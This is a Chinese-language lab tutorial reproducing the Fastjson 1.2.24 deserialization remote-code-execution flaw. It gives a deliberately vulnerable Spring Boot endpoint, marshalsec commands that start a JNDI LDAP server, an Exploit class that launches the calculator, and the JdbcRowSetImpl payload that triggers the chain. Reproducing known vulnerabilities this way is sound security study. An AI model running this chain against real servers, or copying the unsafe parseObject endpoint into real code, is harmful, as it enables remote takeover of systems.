由于工作需要，最近需要验证Fastjson 的反序列化漏洞，但是找了一圈，网上的复现都是直接用的vulhub 的docker 环境，没有搭建环境的过程，本文从0 搭建给出完整的复现过程



#00 环境准备


项目基于spring boot，所需工具如下：

IDEA：开发工具postman：验证漏洞数据，当然burpsuite 也可以，只是个发包工具fastjson：1.2.24marshalsec：漏洞利用工具python3：启动web 服务


#01 漏洞环境搭建


1、IDEA 创建springboot 项目


2、将fastjson 库依赖放入pom.xml 文件中，重新同步maven 项目

 <dependency>            <groupId>com.alibaba</groupId>            <artifactId>fastjson</artifactId>            <version>1.2.24</version> </dependency>


3、创建处理json 的漏洞入口

springboot 中使用controller来进行url 的控制，关键代码如下：逻辑很简单，获取客户端输入，转换成JSON 对象（Fastjson其实就是一个Java 第三方库，可以操作对象和字符串。这里可以看到fastjson 的一个作用：

  • 反序列化--将字符串转换为user 对象，常用的还有另外一个功能：

  • 序列化--将对象转换为字符串）：

    @RequestMapping("/add")    @ResponseBody    public JSONObject add(@RequestBody String data){        String userdata=data.replace("\r\n","");        logger.info(userdata);
        //字符转对象        JSONObject user= JSON.parseObject(userdata);        JSONObject result=new JSONObject();        result.put("msg","success");        result.put("code","200");        result.put("data",user);
        return result;    }

* 代码说明：第3行通过RequestBody 直接获取请求体内容赋值给data 形参

漏洞触发点在第8行，在将字符串转换为JSONObject 对象（反序列化）的时候产生了问题


4、先用postman 提交数据验证下环境是否正常，可以看到功能没问题



#02 漏洞利用


1、工具准备

git clone https://github.com/mbechler/marshalsec.git  【克隆项目到本地】mvn clean package -DskipTests  【这条命令执行完之后会在target 目录生成我们需要的可执行文件：marshalsec-0.0.3-SNAPSHOT-all.jar】java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:8081/#Exploit 10086    【启动jndi ldap 监听】


2、利用代码准备

上面启动可执行文件的过程中，我们指定了一个Exploit  ，这个就是字符串转JSONObject 对象的时候会被调用的class 文件，代码如下，然后javac 或者IDEA 自带的build 功能编译成Exploit.class 文件(只是弹出计算器，代码无害，可放心大胆试)：

public class Exploit {
    public Exploit(){        try{            Runtime.getRuntime().exec("calc");        }catch (Exception e){            e.printStackTrace();        }    }    public static void main(String[] argv){        Exploit c = new Exploit();    }}

在编译好的class 文件所在目录，用python启动web服务，指定端口8081 ，需与“工具准备”中配置端口一致

python -m http.server 8081



来回顾下我们的整体环境准备情况


3、漏洞利用

至此，我们的整个环境搭建完成，万事俱备，只欠东风：我们需要将payload 代码放上去，通过postman 发送到服务器对应的url，触发fastjson 的反序列化漏洞，payload如下，这里ldap 服务的端口要与“工具准备”中的端口一致：

{"@type": "com.sun.rowset.JdbcRowSetImpl","dataSourceName": "ldap://127.0.0.1:10086/Object","autoCommit": true}
